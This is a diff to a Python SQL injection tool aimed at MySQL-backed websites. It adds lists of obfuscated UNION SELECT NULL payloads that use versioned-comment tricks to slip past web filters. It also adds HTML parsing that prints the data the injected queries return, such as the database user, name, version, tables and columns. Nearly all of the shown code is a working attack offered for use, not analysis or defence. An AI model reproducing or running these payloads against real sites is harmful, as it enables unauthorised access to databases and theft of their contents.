@@ -1,9 +1,10 @@
-# v1.1 updated 2
+3 updated success v1.1.5
 import requests
 import os
 import re
 import datetime
 import time
+from bs4 import BeautifulSoup
 
 os.system('cls' if os.name == 'nt' else 'clear')
 def banner():
@@ -48,6 +49,25 @@ payload_name_bypass_1 = [
     '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--+-',
     '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--+-',
     '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--+-',
+    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/ NULL,NULL--+-',
+    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL--+-',
+    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL--+-',
+    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL--+-',
+    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL--+-',
+    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
+    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
+    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
+    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
+    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
+    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
+    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
+    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
+    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
+    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
+    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
+    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
+    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
+    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
 ]
 text_check = 0
 print("[-] Testing 'UNION SELECT COLUMNS'")
@@ -95,18 +115,49 @@ for payload in payload_name_bypass_1:
                             print("[+] URL : {}".format(url))
                             print("[+] PAYLOAD : {}".format(new_payload))
                             print("[+] LINK : {}{}".format(url, new_payload))
+                            print("")
+                            print("Output : ")
+                            html_content = result_1.text
+                            get = BeautifulSoup(html_content, 'html.parser')
+                            output_1 = get.find_all('h1')
+                            output_2 = get.find_all('h2')
+                            output_3 = get.find_all('p')
+                            output_4 = get.find_all('br')
+                            print("{}{}{}{}".format(output_1, output_2, output_3, output_4))
+                            print("")
+                            print("")
                             print("----------------------------")
                             print("database name mysql")
                             print("PARAMETER : database name")
                             print("[+] URL : {}".format(url))
                             print("[+] PAYLOAD : {}".format(query1))
                             print("[+] LINK : {}{}".format(url, query1))
+                            print("Output : ")
+                            html_content = result_1.text
+                            get = BeautifulSoup(html_content, 'html.parser')
+                            output_1 = get.find_all('h1')
+                            output_2 = get.find_all('h2')
+                            output_3 = get.find_all('p')
+                            output_4 = get.find_all('br')
+                            print("{}{}{}{}".format(output_1, output_2, output_3, output_4))
+                            print("")
+                            print("")
                             print("----------------------------")
                             print("version name mysql")
                             print("PARAMETER : version")
                             print("[+] URL : {}".format(url))
                             print("[+] PAYLOAD : {}".format(query2))
                             print("[+] LINK : {}{}".format(url, query2))
+                            print("Output : ")
+                            html_content = result_1.text
+                            get = BeautifulSoup(html_content, 'html.parser')
+                            output_1 = get.find_all('h1')
+                            output_2 = get.find_all('h2')
+                            output_3 = get.find_all('p')
+                            output_4 = get.find_all('br')
+                            print("{}{}{}{}".format(output_1, output_2, output_3, output_4))
+                            print("")
+                            print("")
                             print("----------------------------")
                             print('')
                             choose1 = input("do you want to check Database Tables and columns ? [ Y/n ]: ")
@@ -143,6 +194,16 @@ for payload in payload_name_bypass_1:
                                     print("[:] NUM COLUMNS : {}".format(text_check))
                                     print("[:] PAYLOAD : {}".format(payloads_1))
                                     print("[:] LINK : {}{}".format(url, payloads_1))
+                                    print("Output : ")
+                                    html_content = result_1.text
+                                    get = BeautifulSoup(html_content, 'html.parser')
+                                    output_1 = get.find_all('h1')
+                                    output_2 = get.find_all('h2')
+                                    output_3 = get.find_all('p')
+                                    output_4 = get.find_all('br')
+                                    print("{}{}{}{}".format(output_1, output_2, output_3, output_4))
+                                    print("")
+                                    print("")
                                     print("----------------------------")
                                     exit()
                             elif choose1 == "y":
@@ -178,6 +239,16 @@ for payload in payload_name_bypass_1:
                                     print("[:] NUM COLUMNS : {}".format(text_check))
                                     print("[:] PAYLOAD : {}".format(payloads_1))
                                     print("[:] LINK : {}{}".format(url, payloads_1))
+                                    print("Output : ")
+                                    html_content = result_1.text
+                                    get = BeautifulSoup(html_content, 'html.parser')
+                                    output_1 = get.find_all('h1')
+                                    output_2 = get.find_all('h2')
+                                    output_3 = get.find_all('p')
+                                    output_4 = get.find_all('br')
+                                    print("{}{}{}{}".format(output_1, output_2, output_3, output_4))
+                                    print("")
+                                    print("")
                                     print("----------------------------")
                                     exit()
                             else:
@@ -211,19 +282,49 @@ for payload in payload_name_bypass_1:
                             print("PARAMETER : user")
                             print("[+] URL : {}".format(url))
                             print("[+] PAYLOAD : {}".format(new_payload))
-                            print("[+] LINK : {}{}".format(url, new_payload))
+                            print("[+] LINK : {}{}".format(url, payload))
+                            print("Output : ")
+                            html_content = result_1.text
+                            get = BeautifulSoup(html_content, 'html.parser')
+                            output_1 = get.find_all('h1')
+                            output_2 = get.find_all('h2')
+                            output_3 = get.find_all('p')
+                            output_4 = get.find_all('br')
+                            print("{}{}{}{}".format(output_1, output_2, output_3, output_4))
+                            print("")
+                            print("")
                             print("----------------------------")
                             print("database name mysql")
                             print("PARAMETER : database name")
                             print("[+] URL : {}".format(url))
                             print("[+] PAYLOAD : {}".format(query1))
                             print("[+] LINK : {}{}".format(url, query1))
+                            print("Output : ")
+                            html_content = result_1.text
+                            get = BeautifulSoup(html_content, 'html.parser')
+                            output_1 = get.find_all('h1')
+                            output_2 = get.find_all('h2')
+                            output_3 = get.find_all('p')
+                            output_4 = get.find_all('br')
+                            print("{}{}{}{}".format(output_1, output_2, output_3, output_4))
+                            print("")
+                            print("")
                             print("----------------------------")
                             print("version name mysql")
                             print("PARAMETER : version")
                             print("[+] URL : {}".format(url))
                             print("[+] PAYLOAD : {}".format(query2))
                             print("[+] LINK : {}{}".format(url, query2))
+                            print("Output : ")
+                            html_content = result_1.text
+                            get = BeautifulSoup(html_content, 'html.parser')
+                            output_1 = get.find_all('h1')
+                            output_2 = get.find_all('h2')
+                            output_3 = get.find_all('p')
+                            output_4 = get.find_all('br')
+                            print("{}{}{}{}".format(output_1, output_2, output_3, output_4))
+                            print("")
+                            print("")
                             print("----------------------------")
                             print('')
                             choose1 = input("do you want to check Database Tables and columns ? [ Y/n ]: ")
@@ -264,6 +365,17 @@ for payload in payload_name_bypass_1:
                                     print("[:] PAYLOAD : {}".format(payloads_1))
                                     print("")
                                     print("[:] LINK : {}{}".format(url, payloads_1))
+                                    print("")
+                                    print("Output : ")
+                                    html_content = result_1.text
+                                    get = BeautifulSoup(html_content, 'html.parser')
+                                    output_1 = get.find_all('h1')
+                                    output_2 = get.find_all('h2')
+                                    output_3 = get.find_all('p')
+                                    output_4 = get.find_all('br')
+                                    print("{}{}{}{}".format(output_1, output_2, output_3, output_4))
+                                    print("")
+                                    print("")
                                     print("----------------------------")
                                     exit()
                             elif choose1 == "y":
@@ -299,6 +411,16 @@ for payload in payload_name_bypass_1:
                                     print("[:] NUM COLUMNS : {}".format(text_check))
                                     print("[:] PAYLOAD : {}".format(payloads_1))
                                     print("[:] LINK : {}{}".format(url, payloads_1))
+                                    print("Output : ")
+                                    html_content = result_1.text
+                                    get = BeautifulSoup(html_content, 'html.parser')
+                                    output_1 = get.find_all('h1')
+                                    output_2 = get.find_all('h2')
+                                    output_3 = get.find_all('p')
+                                    output_4 = get.find_all('br')
+                                    print("{}{}{}{}".format(output_1, output_2, output_3, output_4))
+                                    print("")
+                                    print("")
                                     print("----------------------------")
                                     exit()
                             else:
